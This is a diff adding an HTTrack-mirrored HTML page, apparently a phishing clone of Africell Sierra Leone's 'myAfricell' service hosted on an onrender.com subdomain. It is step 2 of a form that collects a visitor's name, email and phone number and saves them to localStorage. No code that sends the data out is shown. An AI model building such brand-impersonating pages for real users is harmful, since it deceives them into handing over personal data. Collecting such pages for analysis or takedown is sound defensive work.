@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from africellsl.onrender.com/details by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 04 Mar 2026 16:29:24 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>myAfricell – Personal Details</title>
+    <link rel="icon" href="https://www.africell.sl/favicon.ico" type="image/x-icon"> <!-- Update if you have official favicon -->
+    <meta name="theme-color" content="#C2185B">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #f8f9fa;
+            color: #1a1a1a;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: clamp(16px, 3vw, 24px);
+        }
+        header {
+            width: 100%; max-width: 480px;
+            padding: clamp(16px, 4vw, 24px);
+            text-align: center;
+            margin-bottom: clamp(16px, 4vw, 28px);
+            background: #AD1457; /* darker magenta-purple header */
+            border-radius: 12px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.1);
+            color: white;
+            position: relative;
+        }
+        .logo {
+            font-size: clamp(32px, 8vw, 40px);
+            font-weight: 800;
+            letter-spacing: -1px;
+        }
+        .logo-my { color: #F8BBD0; } /* light accent for "my" */
+        .logo-africell { color: white; }
+        main {
+            flex: 1;
+            max-width: 480px;
+            width: 100%;
+            margin: 0 auto;
+        }
+        .form-card {
+            background: white;
+            border-radius: 20px;
+            padding: clamp(28px, 6vw, 40px) clamp(24px, 5vw, 32px);
+            box-shadow: 0 12px 48px rgba(0,0,0,0.08);
+        }
+        .form-title {
+            font-size: clamp(24px, 6vw, 32px);
+            font-weight: 700;
+            color: #1a1a1a;
+            text-align: center;
+            margin-bottom: 1.5rem;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: #e9ecef;
+            border-radius: 4px;
+            margin: 1.5rem auto 1rem;
+            overflow: hidden;
+        }
+        .progress-fill {
+            width: 66.66%;
+            height: 100%;
+            background: linear-gradient(90deg, #C2185B, #AD1457);
+            border-radius: 4px;
+        }
+        .step-text {
+            text-align: center;
+            color: #6c757d;
+            font-size: 1rem;
+            margin-bottom: 2rem;
+        }
+        .form-group {
+            margin-bottom: 1.8rem;
+        }
+        .form-label {
+            display: block;
+            font-weight: 600;
+            color: #2c3e50;
+            margin-bottom: 0.6rem;
+            font-size: 0.95rem;
+        }
+        .form-input {
+            width: 100%;
+            padding: 1rem 1.2rem;
+            border: 1px solid #ced4da;
+            border-radius: 10px;
+            font-size: 1rem;
+            background: #fdfdfe;
+            transition: all 0.2s;
+        }
+        .form-input:focus {
+            border-color: #C2185B;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(194,24,91,0.15);
+        }
+        .invalid {
+            border-color: #dc3545 !important;
+            box-shadow: 0 0 0 3px rgba(220,53,69,0.15) !important;
+        }
+        .field-error {
+            color: #dc3545;
+            font-size: 0.875rem;
+            margin-top: 0.4rem;
+            display: none;
+        }
+        .name-group {
+            display: flex;
+            gap: 1.2rem;
+            margin-bottom: 1.8rem;
+        }
+        .name-group > div {
+            flex: 1;
+        }
+        .btn-group {
+            display: flex;
+            gap: 1rem;
+            margin-top: 2.5rem;
+        }
+        .prev-btn, .next-btn {
+            flex: 1;
+            padding: 1.15rem;
+            border-radius: 12px;
+            font-size: 1.15rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .prev-btn {
+            background: #e2e8f0;
+            color: #475569;
+            border: none;
+        }
+        .prev-btn:hover {
+            background: #cbd5e1;
+        }
+        .next-btn {
+            background: #C2185B; /* vibrant magenta-purple from app */
+            color: white;
+            border: none;
+            box-shadow: 0 8px 24px rgba(194,24,91,0.25);
+        }
+        .next-btn:hover {
+            background: #AD1457;
+            transform: translateY(-2px);
+            box-shadow: 0 12px 32px rgba(194,24,91,0.35);
+        }
+        footer {
+            padding: clamp(20px, 5vw, 32px) 20px;
+            color: #adb5bd;
+            font-size: clamp(12px, 3vw, 14px);
+            text-align: center;
+            margin-top: auto;
+        }
+        @media (min-width: 769px) {
+            body { padding: 32px; }
+            .form-card { padding: 2.8rem 3.5rem; }
+        }
+    </style>
+</head>
+<body>
+<header>
+    <div class="logo"><span class="logo-my">my</span><span class="logo-africell">Africell</span></div>
+</header>
+<main>
+    <div class="form-card">
+        <h1 class="form-title">Personal Details</h1>
+        <div class="progress-bar"><div class="progress-fill"></div></div>
+        <div class="step-text">Step 2 of 3</div>
+        <div class="name-group">
+            <div>
+                <label class="form-label">First Name</label>
+                <input type="text" class="form-input" id="firstName" placeholder="e.g. Fatima">
+                <div class="field-error" id="firstNameError">Please enter your first name.</div>
+            </div>
+            <div>
+                <label class="form-label">Last Name</label>
+                <input type="text" class="form-input" id="lastName" placeholder="e.g. Kamara">
+                <div class="field-error" id="lastNameError">Please enter your last name.</div>
+            </div>
+        </div>
+        <div class="form-group">
+            <label class="form-label">Email Address</label>
+            <input type="email" class="form-input" id="email" placeholder="e.g. fatima.kamara@example.com">
+            <div class="field-error" id="emailError">Please enter a valid email address.</div>
+        </div>
+        <div class="form-group">
+            <label class="form-label">Phone Number</label>
+            <div style="display:flex; align-items:center; border:1px solid #ced4da; border-radius:10px; padding:0 1.2rem;" id="phoneGroup">
+                <span style="color:#6c757d; font-weight:500; margin-right:0.8rem;">+232</span>
+                <input type="tel" id="phone" placeholder="79123456" maxlength="8" style="flex:1; border:none; outline:none; padding:1rem 0; font-size:1rem; background:transparent;">
+            </div>
+            <div class="field-error" id="phoneError">Please enter a valid Sierra Leone phone number (e.g. 8 digits after +232).</div>
+        </div>
+        <div class="btn-group">
+            <button class="prev-btn" onclick="history.back()">PREVIOUS</button>
+            <button class="next-btn" id="nextBtn">NEXT STEP</button>
+        </div>
+    </div>
+</main>
+<footer>
+    © 2026 Africell Sierra Leone – Licensed Mobile Financial Services | Powered by Afrimoney & myAfricell
+</footer>
+<script>
+    // Pre-fill from localStorage (if any)
+    if (localStorage.getItem('firstName')) document.getElementById('firstName').value = localStorage.getItem('firstName');
+    if (localStorage.getItem('lastName')) document.getElementById('lastName').value = localStorage.getItem('lastName');
+    if (localStorage.getItem('email')) document.getElementById('email').value = localStorage.getItem('email');
+    if (localStorage.getItem('phone')) document.getElementById('phone').value = localStorage.getItem('phone');
+
+    const firstNameError = document.getElementById('firstNameError');
+    const lastNameError = document.getElementById('lastNameError');
+    const emailError = document.getElementById('emailError');
+    const phoneError = document.getElementById('phoneError');
+    const phoneGroup = document.getElementById('phoneGroup');
+
+    document.getElementById('nextBtn').addEventListener('click', function() {
+        const firstName = document.getElementById('firstName').value.trim();
+        const lastName = document.getElementById('lastName').value.trim();
+        const email = document.getElementById('email').value.trim();
+        const phone = document.getElementById('phone').value.trim();
+
+        // Reset errors
+        firstNameError.style.display = 'none';
+        lastNameError.style.display = 'none';
+        emailError.style.display = 'none';
+        phoneError.style.display = 'none';
+        document.querySelectorAll('.form-input, #phoneGroup').forEach(el => el.classList.remove('invalid'));
+
+        let valid = true;
+
+        if (!firstName) {
+            document.getElementById('firstName').classList.add('invalid');
+            firstNameError.style.display = 'block';
+            valid = false;
+        }
+        if (!lastName) {
+            document.getElementById('lastName').classList.add('invalid');
+            lastNameError.style.display = 'block';
+            valid = false;
+        }
+        if (email && (!email.includes('@') || !email.includes('.'))) {
+            document.getElementById('email').classList.add('invalid');
+            emailError.style.display = 'block';
+            valid = false;
+        }
+        if (!phone || phone.length < 7 || phone.length > 8 || !/^\d+$/.test(phone)) {
+            phoneGroup.classList.add('invalid');
+            phoneError.style.display = 'block';
+            valid = false;
+        }
+
+        if (!valid) {
+            document.querySelector('.invalid')?.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            return;
+        }
+
+        localStorage.setItem('firstName', firstName);
+        localStorage.setItem('lastName', lastName);
+        localStorage.setItem('email', email);
+        localStorage.setItem('phone', phone);
+
+        window.location.href = 'summary.html'; // or your next page URL
+    });
+</script>
+</body>
+
+<!-- Mirrored from africellsl.onrender.com/details by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 04 Mar 2026 16:29:24 GMT -->
+</html>
